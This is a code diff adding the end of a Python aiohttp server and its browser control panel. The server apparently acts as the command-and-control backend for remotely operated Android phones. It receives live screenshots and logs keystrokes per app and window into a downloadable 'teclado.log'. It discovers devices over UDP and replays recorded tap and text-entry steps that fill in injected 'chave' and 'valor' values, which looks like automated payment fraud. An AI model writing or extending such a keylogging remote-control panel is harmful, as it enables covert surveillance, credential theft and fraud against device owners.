+  d.innerHTML='<div class=sm>clique numa linha = gera o passo no perfil</div>'
+    +'<pre id=snappre style="max-height:250px;overflow:auto;font-size:11px;'
+    +'margin:4px 0;background:#010409;padding:6px"></pre>'
+    +'<textarea id=pjson placeholder="[]" style="width:100%;height:150px;'
+    +'font:11px monospace;background:#010409;color:#c9d1d9;border:1px solid #22303c"></textarea>'
+    +'<div style="margin-top:4px"><button onclick="playJ()">Play</button>'
+    +'<button onclick="salvaJ()">Grava</button><button onclick="carregaJ()">Carrega</button>'
+    +'<button onclick="limpaJ()">Limpa</button>'
+    +'<button onclick="document.getElementById(\'snapbox\').style.display=\'none\'">x</button></div>';
+  document.body.appendChild(d);
+  sjson=document.getElementById('pjson');
+}
+function snap(){
+  $('#snapbox').style.display='';
+  c('snap');
+  log('snap enviado');
+}
+function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
+function snapShow(txt){
+  const pre=$('#snappre');
+  pre.innerHTML='';
+  txt.split('\n').forEach(l=>{
+    if(!l.trim())return;
+    const p=l.split('|');
+    const el=document.createElement('div');
+    el.textContent=l;
+    el.style.cssText='cursor:pointer;white-space:pre';
+    el.onclick=()=>insere(p);
+    pre.appendChild(el);
+  });
+}
+function insere(p){
+  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',bd=(p[4]||'').split(',').map(Number),tx=p[5]||'',cd=p[6]||'';
+  const sel={};
+  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
+  else if(tx)sel.txt='^'+jesc(tx)+'$';
+  else if(cd)sel.txt=jesc(cd);
+  else if(cls)sel.cls=jesc(cls);
+  else return;
+  if(fl.indexOf('C')>=0)sel.click=true;
+  if(fl.indexOf('E')>=0)sel.edit=true;
+  const s={do:sel.edit?'set':'tap',sel:sel};
+  if(sel.edit)s.v='{{CHAVE}}';
+  let cur=sjson.value.trim();
+  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
+  let arr=[];
+  if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
+  arr.push(s);
+  sjson.value=JSON.stringify(arr,null,1);
+  log('passo: '+JSON.stringify(sel));
+}
+function playJ(){
+  let t=sjson.value.trim();
+  if(!t){log('perfil vazio');return}
+  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
+  let arr;
+  try{arr=JSON.parse(t)}catch(e){log('json invalido: '+e);return}
+  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
+  log('play '+arr.length+' passos');
+}
+function salvaJ(){localStorage.setItem('perfil',sjson.value);log('perfil gravado')}
+function carregaJ(){sjson.value=localStorage.getItem('perfil')||'';log('perfil carregado')}
+function limpaJ(){sjson.value='';log('limpo')}
+snapUI();
+co();
+</script>"""
+
+def ok(req):
+    return req.query.get("t") == TOKEN
+
+async def bcast(o, only=None):
+    d = json.dumps(o)
+    for v in [v for v, s in VIEW.items() if only is None or s == only]:
+        try: await v.send_str(d)
+        except Exception: pass
+
+async def relay(dev, data):
+    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
+        BUSY.add(v)
+        try: await v.send_bytes(data)
+        except Exception: pass
+        finally: BUSY.discard(v)
+
+async def devs():
+    await bcast({"k": "devs", "d": devlist()})
+
+async def index(req):
+    if not ok(req): raise web.HTTPFound("/?t=" + TOKEN)
+    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")
+
+async def phone(req):
+    if not ok(req): return web.Response(text="token invalido", status=403)
+    if req.headers.get("Upgrade", "").lower() != "websocket":
+        h = req.headers.get("Host", "localhost:8080")
+        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
+        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
+    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
+    await ws.prepare(req)
+    dev = None
+    try:
+        async for m in ws:
+            if m.type == WSMsgType.BINARY:
+                if dev: await relay(dev, m.data)
+            elif m.type == WSMsgType.TEXT:
+                try: o = json.loads(m.data)
+                except Exception: o = {"t": "raw", "o": m.data}
+                if o.get("t") == "hello":
+                    dev = o.get("id", "?")
+                    DEVS[dev] = {"ws": ws, "i": o}
+                    print("+ %s (%d online)" % (dev, len(DEVS)))
+                    await devs()
+                elif o.get("t") == "ka":
+                    try: await ws.send_str('{"c":"ka"}')
+                    except Exception: pass
+                    continue
+                elif o.get("t") == "k":
+                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
+                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
+                                                   "win": o.get("win"), "o": o.get("o", "")}})
+                    continue
+                await bcast({"k": "log", "d": o}, dev)
+    except Exception as e:
+        print("  ! erro em %s: %s" % (dev, e))
+    finally:
+        if dev and DEVS.get(dev, {}).get("ws") is ws:
+            DEVS.pop(dev, None)
+            print("- %s saiu" % dev)
+            await devs()
+    return ws
+
+async def panel(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
+    await ws.prepare(req)
+    VIEW[ws] = None
+    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
+    try:
+        async for m in ws:
+            if m.type != WSMsgType.TEXT: continue
+            try: o = json.loads(m.data)
+            except Exception: continue
+            if o.get("c") == "sel":
+                VIEW[ws] = o.get("id") or None
+                alvo = DEVS.get(VIEW[ws])
+                if alvo:
+                    try:
+                        await alvo["ws"].send_str('{"c":"shot","on":true}')
+                        await alvo["ws"].send_str('{"c":"info"}')
+                    except Exception: pass
+                continue
+            alvo = DEVS.get(o.get("id") or VIEW[ws])
+            if not alvo:
+                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
+                continue
+            VIEW[ws] = o.get("id") or VIEW[ws]
+            try: await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
+            except Exception: pass
+    except Exception: pass
+    finally: VIEW.pop(ws, None)
+    return ws
+
+async def keys_get(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    try: n = min(int(req.query.get("n", 400)), 2000)
+    except Exception: n = 400
+    dev = req.query.get("dev")
+    linhas = []
+    if os.path.exists(KF):
+        with open(KF, encoding="utf-8", errors="replace") as f:
+            for l in f:
+                if dev and ("\t" + dev + "\t") not in l: continue
+                linhas.append(l.rstrip("\n"))
+    return web.json_response({"l": linhas[-n:]})
+
+async def keys_clear(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    open(KF, "w", encoding="utf-8").close()
+    return web.json_response({"ok": True})
+
+async def keys_dl(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    if not os.path.exists(KF): open(KF, "w", encoding="utf-8").close()
+    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})
+
+async def health(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
+    return web.json_response({"ok": True, "devices": devlist()})
+
+def local_ip(dst):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((dst, 9)); return s.getsockname()[0]
+    except Exception: return "127.0.0.1"
+    finally: s.close()
+
+async def udp_loop():
+    loop = asyncio.get_event_loop()
+    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try: sk.bind(("0.0.0.0", 8089))
+    except Exception as e:
+        print("! udp 8089 indisponivel: %s" % e); return
+    sk.setblocking(False)
+    while True:
+        try:
+            data, addr = await loop.sock_recvfrom(sk, 64)
+            if data.strip() == b"AVAL":
+                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
+        except Exception:
+            await asyncio.sleep(0.2)
+
+async def on_start(app):
+    app["udp"] = asyncio.create_task(udp_loop())
+
+def main():
+    app = web.Application()
+    app.router.add_get("/", index)
+    app.router.add_get("/ws", phone)
+    app.router.add_get("/panel", panel)
+    app.router.add_get("/health", health)
+    app.router.add_get("/keys", keys_get)
+    app.router.add_get("/keys/clear", keys_clear)
+    app.router.add_get("/keys/dl", keys_dl)
+    app.on_startup.append(on_start)
+    print("painel: http://localhost:8080/")
+    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)
+
+main()
